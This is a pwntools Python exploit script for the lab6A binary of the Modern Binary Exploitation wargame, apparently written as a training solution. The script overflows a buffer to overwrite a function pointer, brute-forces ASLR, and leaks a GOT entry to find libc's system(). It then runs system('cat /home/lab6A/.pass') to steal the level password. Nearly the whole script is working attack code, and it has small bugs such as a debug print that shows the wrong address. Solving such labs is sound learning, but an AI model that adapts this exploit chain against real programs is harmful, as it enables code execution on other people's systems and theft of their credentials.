# Based on https://github.com/ewilded/MBE-snippets/blob/master/lab6B/exploit_remote.py
from pwn import *
import sys

settings = {

    # Path to binary
    "binary"        : "./lab6A",

    # Path to custom libc
    "libc"          : None,
}

# Exploit here
def exploit():
    p = process(binary.path)
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary

    # Chose action 1 (setup account).
    p.sendlineafter("Enter Choice: ", "1")  
	
    # Send the name (31 characters + newline -> 32 chars)	
    p.recvuntil("Enter your name: ")		
    payload = "A" * 0x1f # 31 A's (just to fill the username)
    p.sendline(payload)
	
	# Send the description - 90 characters + EXACTLY TWO BYTES to partially overwrite the function pointer.
	# To avoid a newline creeping in and fucking up the second byte of the address (out of bound of our PARTIAL write)
	# we want to use send_raw() instead of sendline()/sendlineafter():
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to attain the saved print_listing() address
    payload = payload + p16(0xbbe2)
    p.send(payload)
    
    # OK, call this thing:
    p.sendlineafter("Enter Choice: ", "3")
	
    # Analyze the leak (we have to introduce a way to distinguish when the execution was successful as opposed to when we crashed the thing due to the lack of lack with ASLR and our fixed 0xb halfbyte).
    try:
        leak = p.recv()
	
    except EOFError:
	    print("No luck with ASLR this time.")
	    return 1	# let's return 1 to indicate that the program crashed, which means we failed with our guess of the ASLR-ed halfbyte and that the exploit() function must call this method again
    except:
       print("Another exception occured.")
       return 2

	# Some verbose output for debugging/troubleshooting purpose 
    # (this is redundant with context.log_level='debug' though).
    print("ASLR guess successful, below is the entire leak:") 
    print(leak)

    print_name_addr = u32(leak[0xaa:0xae]) # bytes 170:174 contain the address	
    print("print_name()'s current address: %x", hex(print_name_addr))
	
    # Calculate the base of the code segment:
    base_code = print_name_addr & 0xfffff000
    print("Leaked address base of the text segment: %x", hex(base_code))	
	
    # Calculate the base of the data segment:
    base_data = base_code + 0x3000
    print("Calculated base of the data segment: %x", hex(base_data))
    # This is where GOT for printf is held (we have to leak it with write_wrap())
    printf_got_addr = base_data + 0x10

    print("Calculated address of the printf@got entry: %x", hex(printf_got_addr))
    # Calculate the write_wrap_address based on the known offset and the code segment base we have already leaked
    write_wrap_addr = base_code + 0x97a
    print("Calculated address of the write_wrap() function: %x", hex(write_wrap_addr))
	
	# This is just for debugging purposes, will be removed later
    #print("The pid is (attach with gdb from root and check if the params were calculated correctly): "+str(pidof(p)))
    #pause()
    # Now, we overflow the setup_account() once again.
    # We want our payload to achieve two things at the same time:
    # 1) overwrite the merchanf.sfunc() address once again, this time with write_wrap()'s address
	# 2) put the printf_got_addr at the beginning of the merchant buffer (user.name), because after when when we issue another call below:
	#  ((void (*) (struct uinfo *) ) merchant.sfunc) (&merchant);it is going to become the argument for the 
	# the address pointed by merchant is going to be the argument (which is exactly what we want, we want to pass the GOT to the write_wrap() call, so it prints
	# the libc printf() address to us.
	
	## OK, warning. This is not working as expected, because the overflow behaves differently since the desc buffer is not re-initialized with nulls,
	## so the strlen() in the overflow expression returns much greater value now. This leads to an overflow way further (down the stack) than we wanted.
	## So we want to impact this by introducing nullbytes into the desc buffer before overflowing it again. Luckily, strncpy is helpful with it, so should be read().
	## In order to achieve this, we have to provide an empty username (just send a nullbyte, with no newline char). After strncpy desc should start with a nullbyte,
	## meaning that strlen(desc) will be returning 0. After strcat() with " is a " it will be six bytes long. This means we will now need 118 bytes of trash + ADDR (122 bytes in total) in our desc payload to successfully overwrite the sfunc this time with our value of choice.
	## OK, it seems that basically we simply need to use a username shorter than 32 bytes this time (if read() does not store the nullbyte in it, we're in trouble).
	
	## Actually, we could still smuggle the initial value of the name we want (our param to the write_wrap() function) in the same payload 
    print("Overflowing again to overwrite merchant.sfunc with write_wrap() address...")
    p.sendline(" ") # to pop the prompt again (at this moment we get the 'Enter Choice: ' again in our recv() result, hence the need to call it up again)
    p.sendlineafter("Enter Choice: ", "1") 
    p.recvuntil("Enter your name: ")		
    payload = p32(printf_got_addr)	# this will be the argument to write_wrap() once we call it vis merchant.sfunc(&merchant)
    payload = payload.ljust(0x1f,"A") # fill up with A's so it's exactly 31 bytes long after putting the printf_got_addr there
    p.sendline(payload)	
	
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to overwrite with write_wrap_addr
    payload = payload + p32(write_wrap_addr)
    p.send(payload)
	
    # Then we leak the printf() address by entering 3).
    p.sendlineafter("Enter Choice: ", "3")
    try:
        leak = p.recv()
    except:
        print("We did something wrong, the program has most likely crashed after the second overflow (trying to leak libc's printf() addr from GOT).")
        sys.exit(1)
    # Now we extract it:
    printf_libc_addr = u32(leak[0x0:0x4])
    print("Leaked printf() libc address: %x", hex(printf_libc_addr))
	
    # Then calculate the system() address.
    system_libc_addr = printf_libc_addr - 0xd0f0
    print("Calculated system() libc address: %x", hex(printf_libc_addr))
	
    # Then we issue the setup_account() overflow for the third time, this time by putting an arbitrary string (our command to execute by sh) at the beginning of the merchant buffer (merchant.name), while putting system()'s address after the 90 characters of the description property (overwriting the sfunc pointer for the third time).
	
    print("Overflowing again (third time!), this time to overwrite merchant.sfunc with system() address...")
    p.sendline(" ") # to pop the prompt again (at this moment we get the 'Enter Choice: ' again in our recv() result, hence the need to call it up again)
    p.sendlineafter("Enter Choice: ", "1") 
    p.recvuntil("Enter your name: ")		
    payload = "cat /home/lab6A/.pass;"	# this will be the argument to write_wrap() once we call it vis merchant.sfunc(&merchant)
    payload = payload.ljust(0x1f,"#") # fill up with # so it's exactly 31 bytes long after putting the pass-stealing payload there, the rest of the buffer should be ignored as an argument to cat when passed (the desc buffer)
    p.sendline(payload)	
	
    p.recvuntil("Enter your description: ")
    payload = "B" * 0x5a # exactly ninety bytes to overwrite with system() address
    payload = payload + p32(system_libc_addr)
    p.send(payload)
	
    # Then we execute system("cat /home/lab6A/.pass;#######BBBBB...whatever") by entering 3).
    p.sendlineafter("Enter Choice: ", "3")
    
    print("The password should be on the screen.")

    try:
        leak = p.recv()
    except:
        print("We did something wrong, the program has most likely crashed after the third overflow (trying to steal the password()).")
        sys.exit(1)
	
	# Then we get our code execution by entering 3).
    p.sendlineafter("Enter Choice: ", "3")
	
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = None

    if settings['libc']:
        binary.libc = ELF(settings['libc'])

    while(exploit()): # this will NOT return if successful (instead, it's gonna hang on the shell :))
	    pass
